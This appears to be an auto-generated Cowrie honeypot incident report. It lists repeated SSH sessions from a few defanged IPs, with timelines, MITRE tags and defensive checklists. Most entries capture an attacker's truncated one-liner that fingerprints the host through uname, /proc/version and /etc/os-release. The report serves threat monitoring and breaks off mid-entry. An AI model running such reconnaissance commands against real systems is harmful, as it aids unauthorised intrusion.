### 🔴 HIGH · IR-d80ffb5cb683

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-09 20:17 |
| **Last Seen** | 2026-07-09 20:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:17:08` | `cowrie.session.connect` |
| `2026-07-09 20:17:08` | `cowrie.client.version` |
| `2026-07-09 20:17:08` | `cowrie.client.kex` |
| `2026-07-09 20:17:09` | `cowrie.login.success` |
| `2026-07-09 20:17:10` | `cowrie.session.params` |
| `2026-07-09 20:17:10` | `cowrie.command.input` |
| `2026-07-09 20:17:11` | `cowrie.log.closed` |
| `2026-07-09 20:17:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d36c9f61bac3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:17 |
| **Last Seen** | 2026-07-09 20:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:17:46` | `cowrie.session.connect` |
| `2026-07-09 20:17:46` | `cowrie.client.version` |
| `2026-07-09 20:17:46` | `cowrie.client.kex` |
| `2026-07-09 20:17:47` | `cowrie.login.success` |
| `2026-07-09 20:17:48` | `cowrie.session.params` |
| `2026-07-09 20:17:48` | `cowrie.command.input` |
| `2026-07-09 20:17:48` | `cowrie.command.input` |
| `2026-07-09 20:17:48` | `cowrie.command.input` |
| `2026-07-09 20:17:48` | `cowrie.command.input` |
| `2026-07-09 20:17:48` | `cowrie.command.input` |
| `2026-07-09 20:17:48` | `cowrie.command.success` |
| `2026-07-09 20:17:48` | `cowrie.command.input` |
| `2026-07-09 20:17:48` | `cowrie.command.input` |
| `2026-07-09 20:17:48` | `cowrie.command.input` |
| `2026-07-09 20:17:48` | `cowrie.command.input` |
| `2026-07-09 20:17:48` | `cowrie.log.closed` |
| `2026-07-09 20:17:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d12acd728f5d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:19 |
| **Last Seen** | 2026-07-09 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:19:08` | `cowrie.session.connect` |
| `2026-07-09 20:19:08` | `cowrie.client.version` |
| `2026-07-09 20:19:09` | `cowrie.client.kex` |
| `2026-07-09 20:19:09` | `cowrie.login.success` |
| `2026-07-09 20:19:10` | `cowrie.session.params` |
| `2026-07-09 20:19:10` | `cowrie.command.input` |
| `2026-07-09 20:19:10` | `cowrie.command.input` |
| `2026-07-09 20:19:10` | `cowrie.command.input` |
| `2026-07-09 20:19:10` | `cowrie.command.input` |
| `2026-07-09 20:19:10` | `cowrie.command.input` |
| `2026-07-09 20:19:10` | `cowrie.command.success` |
| `2026-07-09 20:19:10` | `cowrie.command.input` |
| `2026-07-09 20:19:10` | `cowrie.command.input` |
| `2026-07-09 20:19:10` | `cowrie.command.input` |
| `2026-07-09 20:19:10` | `cowrie.command.input` |
| `2026-07-09 20:19:10` | `cowrie.log.closed` |
| `2026-07-09 20:19:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84d017a08cf1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:20 |
| **Last Seen** | 2026-07-09 20:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:20:26` | `cowrie.session.connect` |
| `2026-07-09 20:20:26` | `cowrie.client.version` |
| `2026-07-09 20:20:26` | `cowrie.client.kex` |
| `2026-07-09 20:20:26` | `cowrie.login.success` |
| `2026-07-09 20:20:27` | `cowrie.session.params` |
| `2026-07-09 20:20:27` | `cowrie.command.input` |
| `2026-07-09 20:20:27` | `cowrie.command.input` |
| `2026-07-09 20:20:27` | `cowrie.command.input` |
| `2026-07-09 20:20:27` | `cowrie.command.input` |
| `2026-07-09 20:20:27` | `cowrie.command.input` |
| `2026-07-09 20:20:27` | `cowrie.command.success` |
| `2026-07-09 20:20:27` | `cowrie.command.input` |
| `2026-07-09 20:20:27` | `cowrie.command.input` |
| `2026-07-09 20:20:27` | `cowrie.command.input` |
| `2026-07-09 20:20:27` | `cowrie.command.input` |
| `2026-07-09 20:20:27` | `cowrie.log.closed` |
| `2026-07-09 20:20:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eafe2c39cf33

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:21 |
| **Last Seen** | 2026-07-09 20:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:21:37` | `cowrie.session.connect` |
| `2026-07-09 20:21:38` | `cowrie.client.version` |
| `2026-07-09 20:21:38` | `cowrie.client.kex` |
| `2026-07-09 20:21:38` | `cowrie.login.success` |
| `2026-07-09 20:21:39` | `cowrie.session.params` |
| `2026-07-09 20:21:39` | `cowrie.command.input` |
| `2026-07-09 20:21:39` | `cowrie.command.input` |
| `2026-07-09 20:21:39` | `cowrie.command.input` |
| `2026-07-09 20:21:39` | `cowrie.command.input` |
| `2026-07-09 20:21:39` | `cowrie.command.input` |
| `2026-07-09 20:21:39` | `cowrie.command.success` |
| `2026-07-09 20:21:39` | `cowrie.command.input` |
| `2026-07-09 20:21:39` | `cowrie.command.input` |
| `2026-07-09 20:21:39` | `cowrie.command.input` |
| `2026-07-09 20:21:39` | `cowrie.command.input` |
| `2026-07-09 20:21:39` | `cowrie.log.closed` |
| `2026-07-09 20:21:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca001a8e6fd5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:22 |
| **Last Seen** | 2026-07-09 20:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:22:53` | `cowrie.session.connect` |
| `2026-07-09 20:22:53` | `cowrie.client.version` |
| `2026-07-09 20:22:53` | `cowrie.client.kex` |
| `2026-07-09 20:22:53` | `cowrie.login.success` |
| `2026-07-09 20:22:54` | `cowrie.session.params` |
| `2026-07-09 20:22:54` | `cowrie.command.input` |
| `2026-07-09 20:22:54` | `cowrie.command.input` |
| `2026-07-09 20:22:54` | `cowrie.command.input` |
| `2026-07-09 20:22:54` | `cowrie.command.input` |
| `2026-07-09 20:22:54` | `cowrie.command.input` |
| `2026-07-09 20:22:54` | `cowrie.command.success` |
| `2026-07-09 20:22:54` | `cowrie.command.input` |
| `2026-07-09 20:22:54` | `cowrie.command.input` |
| `2026-07-09 20:22:54` | `cowrie.command.input` |
| `2026-07-09 20:22:54` | `cowrie.command.input` |
| `2026-07-09 20:22:54` | `cowrie.log.closed` |
| `2026-07-09 20:22:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba9baab44c3c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:24 |
| **Last Seen** | 2026-07-09 20:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:24:12` | `cowrie.session.connect` |
| `2026-07-09 20:24:12` | `cowrie.client.version` |
| `2026-07-09 20:24:12` | `cowrie.client.kex` |
| `2026-07-09 20:24:12` | `cowrie.login.success` |
| `2026-07-09 20:24:13` | `cowrie.session.params` |
| `2026-07-09 20:24:13` | `cowrie.command.input` |
| `2026-07-09 20:24:13` | `cowrie.command.input` |
| `2026-07-09 20:24:13` | `cowrie.command.input` |
| `2026-07-09 20:24:13` | `cowrie.command.input` |
| `2026-07-09 20:24:13` | `cowrie.command.input` |
| `2026-07-09 20:24:13` | `cowrie.command.success` |
| `2026-07-09 20:24:13` | `cowrie.command.input` |
| `2026-07-09 20:24:13` | `cowrie.command.input` |
| `2026-07-09 20:24:13` | `cowrie.command.input` |
| `2026-07-09 20:24:13` | `cowrie.command.input` |
| `2026-07-09 20:24:13` | `cowrie.log.closed` |
| `2026-07-09 20:24:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07e9aaffcdfd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:25 |
| **Last Seen** | 2026-07-09 20:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:25:33` | `cowrie.session.connect` |
| `2026-07-09 20:25:33` | `cowrie.client.version` |
| `2026-07-09 20:25:33` | `cowrie.client.kex` |
| `2026-07-09 20:25:34` | `cowrie.login.success` |
| `2026-07-09 20:25:35` | `cowrie.session.params` |
| `2026-07-09 20:25:35` | `cowrie.command.input` |
| `2026-07-09 20:25:35` | `cowrie.command.input` |
| `2026-07-09 20:25:35` | `cowrie.command.input` |
| `2026-07-09 20:25:35` | `cowrie.command.input` |
| `2026-07-09 20:25:35` | `cowrie.command.input` |
| `2026-07-09 20:25:35` | `cowrie.command.success` |
| `2026-07-09 20:25:35` | `cowrie.command.input` |
| `2026-07-09 20:25:35` | `cowrie.command.input` |
| `2026-07-09 20:25:35` | `cowrie.command.input` |
| `2026-07-09 20:25:35` | `cowrie.command.input` |
| `2026-07-09 20:25:35` | `cowrie.log.closed` |
| `2026-07-09 20:25:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b904a25e661

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 20:26 |
| **Last Seen** | 2026-07-09 20:26 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:26:32` | `cowrie.session.connect` |
| `2026-07-09 20:26:33` | `cowrie.client.version` |
| `2026-07-09 20:26:33` | `cowrie.client.kex` |
| `2026-07-09 20:26:38` | `cowrie.login.success` |
| `2026-07-09 20:26:41` | `cowrie.session.params` |
| `2026-07-09 20:26:41` | `cowrie.command.input` |
| `2026-07-09 20:26:42` | `cowrie.log.closed` |
| `2026-07-09 20:26:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11d6104b45ad

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:26 |
| **Last Seen** | 2026-07-09 20:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:26:59` | `cowrie.session.connect` |
| `2026-07-09 20:26:59` | `cowrie.client.version` |
| `2026-07-09 20:26:59` | `cowrie.client.kex` |
| `2026-07-09 20:27:00` | `cowrie.login.success` |
| `2026-07-09 20:27:00` | `cowrie.session.params` |
| `2026-07-09 20:27:00` | `cowrie.command.input` |
| `2026-07-09 20:27:00` | `cowrie.command.input` |
| `2026-07-09 20:27:00` | `cowrie.command.input` |
| `2026-07-09 20:27:00` | `cowrie.command.input` |
| `2026-07-09 20:27:00` | `cowrie.command.input` |
| `2026-07-09 20:27:00` | `cowrie.command.success` |
| `2026-07-09 20:27:00` | `cowrie.command.input` |
| `2026-07-09 20:27:00` | `cowrie.command.input` |
| `2026-07-09 20:27:00` | `cowrie.command.input` |
| `2026-07-09 20:27:00` | `cowrie.command.input` |
| `2026-07-09 20:27:01` | `cowrie.log.closed` |
| `2026-07-09 20:27:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbc96f5d70fc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:28 |
| **Last Seen** | 2026-07-09 20:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:28:29` | `cowrie.session.connect` |
| `2026-07-09 20:28:29` | `cowrie.client.version` |
| `2026-07-09 20:28:29` | `cowrie.client.kex` |
| `2026-07-09 20:28:29` | `cowrie.login.success` |
| `2026-07-09 20:28:30` | `cowrie.session.params` |
| `2026-07-09 20:28:30` | `cowrie.command.input` |
| `2026-07-09 20:28:30` | `cowrie.command.input` |
| `2026-07-09 20:28:30` | `cowrie.command.input` |
| `2026-07-09 20:28:30` | `cowrie.command.input` |
| `2026-07-09 20:28:30` | `cowrie.command.input` |
| `2026-07-09 20:28:30` | `cowrie.command.success` |
| `2026-07-09 20:28:30` | `cowrie.command.input` |
| `2026-07-09 20:28:30` | `cowrie.command.input` |
| `2026-07-09 20:28:30` | `cowrie.command.input` |
| `2026-07-09 20:28:30` | `cowrie.command.input` |
| `2026-07-09 20:28:30` | `cowrie.log.closed` |
| `2026-07-09 20:28:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36799e3e8baa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:30 |
| **Last Seen** | 2026-07-09 20:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:30:00` | `cowrie.session.connect` |
| `2026-07-09 20:30:00` | `cowrie.client.version` |
| `2026-07-09 20:30:00` | `cowrie.client.kex` |
| `2026-07-09 20:30:01` | `cowrie.login.success` |
| `2026-07-09 20:30:02` | `cowrie.session.params` |
| `2026-07-09 20:30:02` | `cowrie.command.input` |
| `2026-07-09 20:30:02` | `cowrie.command.input` |
| `2026-07-09 20:30:02` | `cowrie.command.input` |
| `2026-07-09 20:30:02` | `cowrie.command.input` |
| `2026-07-09 20:30:02` | `cowrie.command.input` |
| `2026-07-09 20:30:02` | `cowrie.command.success` |
| `2026-07-09 20:30:02` | `cowrie.command.input` |
| `2026-07-09 20:30:02` | `cowrie.command.input` |
| `2026-07-09 20:30:02` | `cowrie.command.input` |
| `2026-07-09 20:30:02` | `cowrie.command.input` |
| `2026-07-09 20:30:02` | `cowrie.log.closed` |
| `2026-07-09 20:30:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed1b238957f6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:31 |
| **Last Seen** | 2026-07-09 20:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:31:31` | `cowrie.session.connect` |
| `2026-07-09 20:31:31` | `cowrie.client.version` |
| `2026-07-09 20:31:31` | `cowrie.client.kex` |
| `2026-07-09 20:31:31` | `cowrie.login.success` |
| `2026-07-09 20:31:32` | `cowrie.session.params` |
| `2026-07-09 20:31:32` | `cowrie.command.input` |
| `2026-07-09 20:31:32` | `cowrie.command.input` |
| `2026-07-09 20:31:32` | `cowrie.command.input` |
| `2026-07-09 20:31:32` | `cowrie.command.input` |
| `2026-07-09 20:31:32` | `cowrie.command.input` |
| `2026-07-09 20:31:32` | `cowrie.command.success` |
| `2026-07-09 20:31:32` | `cowrie.command.input` |
| `2026-07-09 20:31:32` | `cowrie.command.input` |
| `2026-07-09 20:31:32` | `cowrie.command.input` |
| `2026-07-09 20:31:32` | `cowrie.command.input` |
| `2026-07-09 20:31:32` | `cowrie.log.closed` |
| `2026-07-09 20:31:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ba07a016a06

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:33 |
| **Last Seen** | 2026-07-09 20:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
